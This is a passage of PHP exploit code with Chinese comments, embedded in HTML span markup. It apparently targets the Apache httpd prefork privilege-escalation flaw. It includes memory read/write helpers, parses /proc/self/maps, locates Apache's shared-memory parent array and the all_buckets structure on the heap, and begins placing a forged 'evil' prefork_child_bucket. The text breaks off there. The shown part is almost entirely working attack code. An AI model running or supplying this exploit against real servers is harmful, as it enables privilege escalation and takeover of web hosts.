* pow(256,$j);</span><span class="cs8926E06"><br/></span><span class="cs9FB05234"> &nbsp;&nbsp;&nbsp;}</span><span class="cs8926E06"><br/></span><span class="cs9FB05234"> &nbsp;&nbsp;&nbsp;return $ret;</span><span class="cs8926E06"><br/></span><span class="cs9FB05234">}</span><span class="cs8926E06"><br/><br/></span><span class="cs9FB05234">function read_mem_byte($addr)</span><span class="cs8926E06"><br/></span><span class="cs9FB05234">{</span><span class="cs8926E06"><br/></span><span class="cs9FB05234"> &nbsp;&nbsp;&nbsp;return read_mem($addr);</span><span class="cs8926E06"><br/></span><span class="cs9FB05234">}</span><span class="cs8926E06"><br/><br/></span><span class="cs9FB05234">function write_mem_qword($addr,$data)</span><span class="cs8926E06"><br/></span><span class="cs9FB05234">{</span><span class="cs8926E06"><br/></span><span class="cs9FB05234"> &nbsp;&nbsp;&nbsp;for($j=0;$j&lt;8;$j++){</span><span class="cs8926E06"><br/></span><span class="cs9FB05234"> &nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;$b = (0xff&amp;(($data)&gt;&gt;($j*8)));</span><span class="cs8926E06"><br/></span><span class="cs9FB05234"> &nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;write_mem($addr+$j,$b);</span><span class="cs8926E06"><br/></span><span class="cs9FB05234"> &nbsp;&nbsp;&nbsp;}</span><span class="cs8926E06"><br/></span><span class="cs9FB05234">}</span><span class="cs8926E06"><br/><br/></span><span class="cs9FB05234">function write_mem_dword($addr,$data)</span><span class="cs8926E06"><br/></span><span class="cs9FB05234">{</span><span class="cs8926E06"><br/></span><span class="cs9FB05234"> &nbsp;&nbsp;&nbsp;for($j=0;$j&lt;4;$j++){</span><span class="cs8926E06"><br/></span><span class="cs9FB05234"> &nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;$b = (0xff&amp;(($data)&gt;&gt;($j*8)));</span><span class="cs8926E06"><br/></span><span class="cs9FB05234"> &nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;write_mem($addr+$j,$b);</span><span class="cs8926E06"><br/></span><span class="cs9FB05234"> &nbsp;&nbsp;&nbsp;}</span><span class="cs8926E06"><br/></span><span class="cs9FB05234">}</span><span class="cs8926E06"><br/><br/></span><span class="cs9FB05234">function write_mem_byte($addr,$data)</span><span class="cs8926E06"><br/></span><span class="cs9FB05234">{</span><span class="cs8926E06"><br/></span><span class="cs9FB05234"> &nbsp;&nbsp;&nbsp;write_mem($addr,$data);</span><span class="cs8926E06"><br/></span><span class="cs9FB05234">}</span><span class="cs8926E06"><br/><br/></span><span class="cs9FB05234">/*</span><span class="cs8926E06"><br/></span><span class="cs9FB05234">get_mem_region:</span><span class="cs8926E06"><br/><br/></span><span class="cs9FB05234">str</span><span class="cs7FFD2630">为，</span><span class="cs9FB05234">maps</span><span class="cs7FFD2630">文件中的特征字符串</span><span class="cs9FB05234">,</span><span class="cs7FFD2630">用于搜索指定的内存区域</span><span class="cs8926E06"><br/><br/></span><span class="cs7FFD2630">返回值为</span><span class="cs9FB05234">:</span><span class="cs8926E06"><br/></span><span class="cs9FB05234">array(2) {</span><span class="cs8926E06"><br/></span><span class="cs9FB05234"> &nbsp;&nbsp;&nbsp;[0]=&gt;//</span><span class="cs7FFD2630">第一个匹配的内存区域</span><span class="cs8926E06"><br/></span><span class="cs9FB05234"> &nbsp;&nbsp;&nbsp;array(2) {</span><span class="cs8926E06"><br/></span><span class="cs9FB05234"> &nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;[0]=&gt;</span><span class="cs8926E06"><br/></span><span class="cs9FB05234"> &nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;int(140231115968512)//</span><span class="cs7FFD2630">起始地址</span><span class="cs8926E06"><br/></span><span class="cs9FB05234"> &nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;[1]=&gt;</span><span class="cs8926E06"><br/></span><span class="cs9FB05234"> &nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;int(140231116066816)//</span><span class="cs7FFD2630">结束地址</span><span class="cs8926E06"><br/></span><span class="cs9FB05234"> &nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;[2]=&gt;</span><span class="cs8926E06"><br/></span><span class="cs9FB05234"> &nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;string(4) &quot;rw-s&quot;//</span><span class="cs7FFD2630">保护权限</span><span class="cs8926E06"><br/></span><span class="cs9FB05234"> &nbsp;&nbsp;&nbsp;}</span><span class="cs8926E06"><br/></span><span class="cs9FB05234"> &nbsp;&nbsp;&nbsp;[1]=&gt;//</span><span class="cs7FFD2630">第二个匹配的内存区域</span><span class="cs8926E06"><br/></span><span class="cs9FB05234"> &nbsp;&nbsp;&nbsp;array(2) {</span><span class="cs8926E06"><br/></span><span class="cs9FB05234"> &nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;[0]=&gt;</span><span class="cs8926E06"><br/></span><span class="cs9FB05234"> &nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;int(140231116201984)</span><span class="cs8926E06"><br/></span><span class="cs9FB05234"> &nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;[1]=&gt;</span><span class="cs8926E06"><br/></span><span class="cs9FB05234"> &nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;int(140231116718080)</span><span class="cs8926E06"><br/></span><span class="cs9FB05234"> &nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;[2]=&gt;</span><span class="cs8926E06"><br/></span><span class="cs9FB05234"> &nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;string(4) &quot;rw-s&quot;//</span><span class="cs7FFD2630">保护权限</span><span class="cs8926E06"><br/></span><span class="cs9FB05234"> &nbsp;&nbsp;&nbsp;}</span><span class="cs8926E06"><br/></span><span class="cs9FB05234">}</span><span class="cs8926E06"><br/><br/></span><span class="cs9FB05234">*/</span><span class="cs8926E06"><br/></span><span class="cs9FB05234">function get_mem_region($str)</span><span class="cs8926E06"><br/></span><span class="cs9FB05234">{</span><span class="cs8926E06"><br/></span><span class="cs9FB05234"> &nbsp;&nbsp;&nbsp;$file = fopen(&quot;/proc/self/maps&quot;,&quot;r&quot;);</span><span class="cs8926E06"><br/></span><span class="cs9FB05234"> &nbsp;&nbsp;&nbsp;$result_index = 0;</span><span class="cs8926E06"><br/></span><span class="cs9FB05234"> &nbsp;&nbsp;&nbsp;$result = array();</span><span class="cs8926E06"><br/></span><span class="cs9FB05234"> &nbsp;&nbsp;&nbsp;while(!feof($file)){</span><span class="cs8926E06"><br/></span><span class="cs9FB05234"> &nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;$line = fgets($file);</span><span class="cs8926E06"><br/></span><span class="cs9FB05234"> &nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;if(strpos($line,$str)){</span><span class="cs8926E06"><br/></span><span class="cs9FB05234"> &nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;$addr_len = 0;</span><span class="cs8926E06"><br/></span><span class="cs9FB05234"> &nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;for(;$line[$addr_len]!=&#39;-&#39;;$addr_len++);</span><span class="cs8926E06"><br/><br/></span><span class="cs9FB05234"> &nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;$start_addr_str = &nbsp;substr($line,0,$addr_len);</span><span class="cs8926E06"><br/></span><span class="cs9FB05234"> &nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;$end_addr_str = substr($line,$addr_len+1,$addr_len);</span><span class="cs8926E06"><br/><br/></span><span class="cs9FB05234"> &nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;$result[$result_index][0] = hexdec($start_addr_str);</span><span class="cs8926E06"><br/></span><span class="cs9FB05234"> &nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;$result[$result_index][1] = hexdec($end_addr_str);</span><span class="cs8926E06"><br/></span><span class="cs9FB05234"> &nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;$result[$result_index][2] = substr($line,$addr_len*2+2,4);</span><span class="cs8926E06"><br/></span><span class="cs9FB05234"> &nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;$result_index++;</span><span class="cs8926E06"><br/></span><span class="cs9FB05234"> &nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;}</span><span class="cs8926E06"><br/></span><span class="cs9FB05234"> &nbsp;&nbsp;&nbsp;}</span><span class="cs8926E06"><br/></span><span class="cs9FB05234"> &nbsp;&nbsp;&nbsp;fclose($file);</span><span class="cs8926E06"><br/><br/></span><span class="cs9FB05234"> &nbsp;&nbsp;&nbsp;return $result;</span><span class="cs8926E06"><br/></span><span class="cs9FB05234">}</span><span class="cs8926E06"><br/><br/><br/></span><span class="cs9FB05234">function locate_parent_arr_addr()//</span><span class="cs7FFD2630">获取共享内存中，</span><span class="cs9FB05234">parent</span><span class="cs7FFD2630">数组的首地址</span><span class="cs8926E06"><br/></span><span class="cs9FB05234">{</span><span class="cs8926E06"><br/></span><span class="cs9FB05234"> &nbsp;&nbsp;&nbsp;$my_pid = getmypid();</span><span class="cs8926E06"><br/></span><span class="cs9FB05234"> &nbsp;&nbsp;&nbsp;$shm_region = get_mem_region(&quot;/dev/zero&quot;);</span><span class="cs8926E06"><br/></span><span class="cs9FB05234"> &nbsp;&nbsp;&nbsp;if(!count($shm_region))</span><span class="cs8926E06"><br/></span><span class="cs9FB05234"> &nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;return 0;</span><span class="cs8926E06"><br/><br/></span><span class="cs9FB05234"> &nbsp;&nbsp;&nbsp;//parent</span><span class="cs7FFD2630">数组项的大小是，每个</span><span class="cs9FB05234">0x20</span><span class="cs7FFD2630">个字节</span><span class="cs8926E06"><br/></span><span class="cs9FB05234"> &nbsp;&nbsp;&nbsp;//pid_t</span><span class="cs7FFD2630">在我环境中，大小</span><span class="cs9FB05234">4</span><span class="cs7FFD2630">字节</span><span class="cs8926E06"><br/></span><span class="cs9FB05234"> &nbsp;&nbsp;&nbsp;$pid_t_size = 4;</span><span class="cs8926E06"><br/></span><span class="cs9FB05234"> &nbsp;&nbsp;&nbsp;$parent_size = 0x24;</span><span class="cs8926E06"><br/><br/></span><span class="cs9FB05234"> &nbsp;&nbsp;&nbsp;//</span><span class="cs7FFD2630">只检查共享内存的前</span><span class="cs9FB05234">0x1000</span><span class="cs7FFD2630">字节</span><span class="cs9FB05234">(4KB)</span><span class="cs8926E06"><br/></span><span class="cs9FB05234"> &nbsp;&nbsp;&nbsp;for($i = 0;$i&lt;0x1000;$i++){</span><span class="cs8926E06"><br/></span><span class="cs9FB05234"> &nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;$hit_count = 0;</span><span class="cs8926E06"><br/></span><span class="cs9FB05234"> &nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;for($j = 0;$j&lt;5;$j++){//</span><span class="cs7FFD2630">循环次数，请参考</span><span class="cs9FB05234">httpd-mpm.conf</span><span class="cs7FFD2630">中的</span><span class="cs9FB05234">prefork</span><span class="cs7FFD2630">的</span><span class="cs9FB05234">MinSpareServers</span><span class="cs8926E06"><br/></span><span class="cs9FB05234"> &nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;$pid = read_mem_dword($shm_region[0][0]+ $i + $j*$parent_size);</span><span class="cs8926E06"><br/></span><span class="cs9FB05234"> &nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;if( $my_pid - 20 &lt; $pid &amp;&amp; $pid &lt; $my_pid+20){//</span><span class="cs7FFD2630">因为</span><span class="cs9FB05234">prefork</span><span class="cs7FFD2630">中，进程的</span><span class="cs9FB05234">pid</span><span class="cs7FFD2630">是紧挨的，我们可以通过这个来判断是否是</span><span class="cs9FB05234">parent</span><span class="cs7FFD2630">数组的首地址</span><span class="cs8926E06"><br/></span><span class="cs9FB05234"> &nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;$hit_count++; &nbsp;&nbsp;&nbsp;</span><span class="cs8926E06"><br/></span><span class="cs9FB05234"> &nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;}</span><span class="cs8926E06"><br/></span><span class="cs9FB05234"> &nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;}</span><span class="cs8926E06"><br/></span><span class="cs9FB05234"> &nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;if($hit_count == 5){</span><span class="cs8926E06"><br/></span><span class="cs9FB05234"> &nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;return $shm_region[0][0]+$i;</span><span class="cs8926E06"><br/></span><span class="cs9FB05234"> &nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;}</span><span class="cs8926E06"><br/></span><span class="cs9FB05234"> &nbsp;&nbsp;&nbsp;}</span><span class="cs8926E06"><br/><br/><br/></span><span class="cs9FB05234"> &nbsp;&nbsp;&nbsp;return 0;</span><span class="cs8926E06"><br/></span><span class="cs9FB05234">}</span><span class="cs8926E06"><br/><br/><br/><br/></span><span class="cs9FB05234">function locate_self_parent_struct_addr()//</span><span class="cs7FFD2630">获取共享内存中，当前</span><span class="cs9FB05234">parent</span><span class="cs7FFD2630">的首地址</span><span class="cs8926E06"><br/></span><span class="cs9FB05234">{</span><span class="cs8926E06"><br/></span><span class="cs9FB05234"> &nbsp;&nbsp;&nbsp;$my_pid = getmypid();</span><span class="cs8926E06"><br/></span><span class="cs9FB05234"> &nbsp;&nbsp;&nbsp;$shm_region = get_mem_region(&quot;/dev/zero&quot;);</span><span class="cs8926E06"><br/></span><span class="cs9FB05234"> &nbsp;&nbsp;&nbsp;if(!count($shm_region))</span><span class="cs8926E06"><br/></span><span class="cs9FB05234"> &nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;return 0;</span><span class="cs8926E06"><br/></span><span class="cs9FB05234"> &nbsp;&nbsp;&nbsp;//</span><span class="cs7FFD2630">因为</span><span class="cs9FB05234">parent</span><span class="cs7FFD2630">数组，总是位于第一个</span><span class="cs9FB05234">/dev/zero</span><span class="cs7FFD2630">中，所以，我们只搜索第一个</span><span class="cs8926E06"><br/></span><span class="cs9FB05234"> &nbsp;&nbsp;&nbsp;echo &quot;/dev/zero start addr:0x&quot;.dechex($shm_region[0][0]).&quot;\n&quot;;</span><span class="cs8926E06"><br/></span><span class="cs9FB05234"> &nbsp;&nbsp;&nbsp;echo &quot;/dev/zero end addr:0x&quot;.dechex($shm_region[0][1]).&quot;\n&quot;;</span><span class="cs8926E06"><br/><br/><br/></span><span class="cs9FB05234"> &nbsp;&nbsp;&nbsp;for($i =0;$i&lt;4096;$i++){</span><span class="cs8926E06"><br/></span><span class="cs9FB05234"> &nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;$pid = read_mem_dword($shm_region[0][0]+$i);//pid_t</span><span class="cs7FFD2630">在我的环境中，为</span><span class="cs9FB05234">4</span><span class="cs7FFD2630">字节大小</span><span class="cs8926E06"><br/></span><span class="cs9FB05234"> &nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;if($pid == $my_pid){</span><span class="cs8926E06"><br/></span><span class="cs9FB05234"> &nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;return $shm_region[0][0]+$i;//</span><span class="cs7FFD2630">找到直接返回</span><span class="cs8926E06"><br/></span><span class="cs9FB05234"> &nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;}</span><span class="cs8926E06"><br/></span><span class="cs9FB05234"> &nbsp;&nbsp;&nbsp;}</span><span class="cs8926E06"><br/><br/></span><span class="cs9FB05234"> &nbsp;&nbsp;&nbsp;return 0;</span><span class="cs8926E06"><br/></span><span class="cs9FB05234">}</span><span class="cs8926E06"><br/><br/></span><span class="cs9FB05234">//</span><span class="cs7FFD2630">获取</span><span class="cs9FB05234">all_buckets</span><span class="cs7FFD2630">的地址</span><span class="cs8926E06"><br/></span><span class="cs9FB05234">function locate_all_buckets_addr()</span><span class="cs8926E06"><br/></span><span class="cs9FB05234">{</span><span class="cs8926E06"><br/></span><span class="cs9FB05234"> &nbsp;&nbsp;&nbsp;$heap_region = get_mem_region(&quot;heap&quot;);//</span><span class="cs7FFD2630">在我的环境中，</span><span class="cs9FB05234">all_bucket</span><span class="cs7FFD2630">位于第一个</span><span class="cs9FB05234">heap</span><span class="cs7FFD2630">中</span><span class="cs8926E06"><br/></span><span class="cs9FB05234"> &nbsp;&nbsp;&nbsp;$libapr_region = get_mem_region(&quot;libapr-&quot;);</span><span class="cs8926E06"><br/></span><span class="cs9FB05234"> &nbsp;&nbsp;&nbsp;if(!count($heap_region) || !count($libapr_region))</span><span class="cs8926E06"><br/></span><span class="cs9FB05234"> &nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;return 0;</span><span class="cs8926E06"><br/></span><span class="cs9FB05234"> &nbsp;&nbsp;&nbsp;$heap_start_addr = $heap_region[0][0];</span><span class="cs8926E06"><br/></span><span class="cs9FB05234"> &nbsp;&nbsp;&nbsp;$heap_end_addr = $heap_region[0][1];</span><span class="cs8926E06"><br/><br/></span><span class="cs9FB05234"> &nbsp;&nbsp;&nbsp;echo &quot;heap start addr:0x&quot;.dechex($heap_start_addr).&quot;\n&quot;;</span><span class="cs8926E06"><br/></span><span class="cs9FB05234"> &nbsp;&nbsp;&nbsp;echo &quot;heap end addr:0x&quot;.dechex($heap_end_addr).&quot;\n&quot;;</span><span class="cs8926E06"><br/><br/></span><span class="cs9FB05234"> &nbsp;&nbsp;&nbsp;$libapr_text_start_addr = 0;</span><span class="cs8926E06"><br/></span><span class="cs9FB05234"> &nbsp;&nbsp;&nbsp;$libapr_data_start_addr = 0;</span><span class="cs8926E06"><br/></span><span class="cs9FB05234"> &nbsp;&nbsp;&nbsp;$libapr_text_end_addr = 0;</span><span class="cs8926E06"><br/></span><span class="cs9FB05234"> &nbsp;&nbsp;&nbsp;$libapr_data_end_addr = 0;</span><span class="cs8926E06"><br/></span><span class="cs9FB05234"> &nbsp;&nbsp;&nbsp;for($i = 0;$i&lt;count($libapr_region);$i++){</span><span class="cs8926E06"><br/></span><span class="cs9FB05234"> &nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;if($libapr_region[$i][2] === &quot;r-xp&quot;){//</span><span class="cs7FFD2630">代码段</span><span class="cs8926E06"><br/></span><span class="cs9FB05234"> &nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;$libapr_text_start_addr = $libapr_region[$i][0];</span><span class="cs8926E06"><br/></span><span class="cs9FB05234"> &nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;$libapr_text_end_addr = $libapr_region[$i][1];</span><span class="cs8926E06"><br/></span><span class="cs9FB05234"> &nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;continue;</span><span class="cs8926E06"><br/></span><span class="cs9FB05234"> &nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;}</span><span class="cs8926E06"><br/><br/></span><span class="cs9FB05234"> &nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;if($libapr_region[$i][2] === &quot;r--p&quot;){//const data</span><span class="cs8926E06"><br/></span><span class="cs9FB05234"> &nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;$libapr_data_start_addr = $libapr_region[$i][0];</span><span class="cs8926E06"><br/></span><span class="cs9FB05234"> &nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;$libapr_data_end_addr = $libapr_region[$i][1];</span><span class="cs8926E06"><br/></span><span class="cs9FB05234"> &nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;continue;</span><span class="cs8926E06"><br/></span><span class="cs9FB05234"> &nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;}</span><span class="cs8926E06"><br/></span><span class="cs9FB05234"> &nbsp;&nbsp;&nbsp;}</span><span class="cs8926E06"><br/><br/></span><span class="cs9FB05234"> &nbsp;&nbsp;&nbsp;echo &quot;libapr text start addr:0x&quot;.dechex($libapr_text_start_addr).&quot;\n&quot;;</span><span class="cs8926E06"><br/></span><span class="cs9FB05234"> &nbsp;&nbsp;&nbsp;echo &quot;libapr text end addr:0x&quot;.dechex($libapr_text_end_addr).&quot;\n&quot;;</span><span class="cs8926E06"><br/><br/></span><span class="cs9FB05234"> &nbsp;&nbsp;&nbsp;echo &quot;libapr data start addr:0x&quot;.dechex($libapr_data_start_addr).&quot;\n&quot;;</span><span class="cs8926E06"><br/></span><span class="cs9FB05234"> &nbsp;&nbsp;&nbsp;echo &quot;libapr data end addr:0x&quot;.dechex($libapr_data_end_addr).&quot;\n&quot;;</span><span class="cs8926E06"><br/><br/></span><span class="cs9FB05234"> &nbsp;&nbsp;&nbsp;$result = array();</span><span class="cs8926E06"><br/></span><span class="cs9FB05234"> &nbsp;&nbsp;&nbsp;$result_index = 0;</span><span class="cs8926E06"><br/></span><span class="cs9FB05234"> &nbsp;&nbsp;&nbsp;for($i = 0;$i&lt;$heap_end_addr - $heap_start_addr;$i+=8){//</span><span class="cs7FFD2630">遍历</span><span class="cs9FB05234">heap</span><span class="cs8926E06"><br/></span><span class="cs9FB05234"> &nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;$mutex_addr = read_mem_qword($heap_start_addr + $i);//prefork_child_bucket</span><span class="cs7FFD2630">中的</span><span class="cs9FB05234">mutex</span><span class="cs8926E06"><br/></span><span class="cs9FB05234"> &nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;if( $heap_start_addr &lt;$mutex_addr &amp;&amp; $mutex_addr&lt;$heap_end_addr ){</span><span class="cs8926E06"><br/><br/></span><span class="cs9FB05234"> &nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;$meth_addr = read_mem_qword($mutex_addr + 8);//apr_proc_mutex_t</span><span class="cs7FFD2630">中的</span><span class="cs9FB05234">meth</span><span class="cs8926E06"><br/><br/></span><span class="cs9FB05234"> &nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;if( $libapr_data_start_addr &lt; $meth_addr &amp;&amp; $meth_addr &lt; $libapr_data_end_addr){</span><span class="cs8926E06"><br/><br/></span><span class="cs9FB05234"> &nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;$function_point = read_mem_qword($meth_addr+8);</span><span class="cs8926E06"><br/></span><span class="cs9FB05234"> &nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;if($libapr_text_start_addr &lt; $function_point &amp;&amp; $function_point &lt; $libapr_text_end_addr){</span><span class="cs8926E06"><br/></span><span class="cs9FB05234"> &nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;$result[$result_index++] = $heap_start_addr + $i - 8 -8;</span><span class="cs8926E06"><br/></span><span class="cs9FB05234"> &nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;}</span><span class="cs8926E06"><br/></span><span class="cs9FB05234"> &nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;}</span><span class="cs8926E06"><br/></span><span class="cs9FB05234"> &nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;}</span><span class="cs8926E06"><br/></span><span class="cs9FB05234"> &nbsp;&nbsp;&nbsp;}</span><span class="cs8926E06"><br/><br/></span><span class="cs9FB05234"> &nbsp;&nbsp;&nbsp;//</span><span class="cs7FFD2630">在我的环境中，有多个地址满足是</span><span class="cs9FB05234">all_buckets </span><span class="cs7FFD2630">地址的要求，但是只有第</span><span class="cs9FB05234">3</span><span class="cs7FFD2630">个才是正确的</span><span class="cs8926E06"><br/></span><span class="cs9FB05234"> &nbsp;&nbsp;&nbsp;if( count($result)!= 4 ){</span><span class="cs8926E06"><br/></span><span class="cs9FB05234"> &nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;return 0;</span><span class="cs8926E06"><br/></span><span class="cs9FB05234"> &nbsp;&nbsp;&nbsp;}</span><span class="cs8926E06"><br/></span><span class="cs9FB05234"> &nbsp;&nbsp;&nbsp;else{</span><span class="cs8926E06"><br/></span><span class="cs9FB05234"> &nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;return $result[2];</span><span class="cs8926E06"><br/></span><span class="cs9FB05234"> &nbsp;&nbsp;&nbsp;}</span><span class="cs8926E06"><br/></span><span class="cs9FB05234">}</span><span class="cs8926E06"><br/><br/></span><span class="cs9FB05234">echo &quot;PID: &quot;.getmypid().&quot;\n&quot;;</span><span class="cs8926E06"><br/><br/></span><span class="cs9FB05234">$parent_struct_addr = locate_self_parent_struct_addr();</span><span class="cs8926E06"><br/></span><span class="cs9FB05234">if($parent_struct_addr == 0){</span><span class="cs8926E06"><br/></span><span class="cs9FB05234"> &nbsp;&nbsp;&nbsp;die(&quot;get self parent struct addr error\n&quot;);</span><span class="cs8926E06"><br/></span><span class="cs9FB05234">}</span><span class="cs8926E06"><br/></span><span class="cs9FB05234">echo &quot;self parent struct addr:0x&quot;.dechex($parent_struct_addr).&quot;\n&quot;;</span><span class="cs8926E06"><br/><br/></span><span class="cs9FB05234">$parent_arr_addr = locate_parent_arr_addr();</span><span class="cs8926E06"><br/></span><span class="cs9FB05234">if($parent_arr_addr){</span><span class="cs8926E06"><br/></span><span class="cs9FB05234"> &nbsp;&nbsp;&nbsp;echo &quot;parent arr addr:0x&quot;.dechex($parent_arr_addr).&quot;\n&quot;;</span><span class="cs8926E06"><br/></span><span class="cs9FB05234">}</span><span class="cs8926E06"><br/><br/></span><span class="cs9FB05234">$all_buckets_addr = locate_all_buckets_addr();</span><span class="cs8926E06"><br/></span><span class="cs9FB05234">if($all_buckets_addr == 0){</span><span class="cs8926E06"><br/></span><span class="cs9FB05234"> &nbsp;&nbsp;&nbsp;die(&quot;get all_buckets addr error\n&quot;);</span><span class="cs8926E06"><br/></span><span class="cs9FB05234">}</span><span class="cs8926E06"><br/></span><span class="cs9FB05234">echo &quot;all_buckets addr:0x&quot;.dechex($all_buckets_addr).&quot;\n&quot;;</span><span class="cs8926E06"><br/><br/></span><span class="cs9FB05234">$evil_parent_start_addr = $parent_arr_addr + 0x24 * 10;//(</span><span class="cs7FFD2630">我这里的</span><span class="cs9FB05234">parent </span><span class="cs7FFD2630">就是</span><span class="cs9FB05234"> prefork_child_bucket</span><span class="cs7FFD2630">结构，</span><span class="cs9FB05234">0x24</span><span class="cs7FFD2630">是每个</span><span class="cs9FB05234">prefork_child_bucket</span><span class="cs7FFD2630">的大小，</span><span class="cs9FB05234">10</span><span class="cs7FFD2630">参考</span><span class="cs9FB05234">http-mpm.conf</span><span class="cs7FFD2630">中</span><span class="cs9FB05234">prefork</span><span class="cs7FFD2630">的</span><span class="cs9FB05234">MaxSpareServers)</span><span class="cs8926E06"><br/><br/></span><span class="cs9FB05234">echo &quot;evil prefork_child_bucket start addr:0x&quot;.dechex($evil_parent_start_addr).&quot;\n&quot;;</span><span 